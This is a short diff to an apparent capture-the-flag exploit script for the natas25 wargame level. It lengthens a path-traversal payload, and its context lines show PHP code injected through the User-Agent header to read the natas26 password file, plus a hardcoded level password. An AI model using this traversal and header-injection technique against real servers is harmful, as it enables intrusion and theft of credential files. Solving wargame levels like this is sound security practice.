@@ -53,7 +53,7 @@ def dissect_response(response):
 
 def exploit():
     sess = requests.Session()
-    _payload = "en../"
+    _payload = "en../../"
     headers = {'User-Agent': '<?php global $__FOOTER; $__FOOTER=file_get_contents("/etc/natas_webpass/natas26"); ?>'}
     auth_username = 'natas25'
     auth_password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
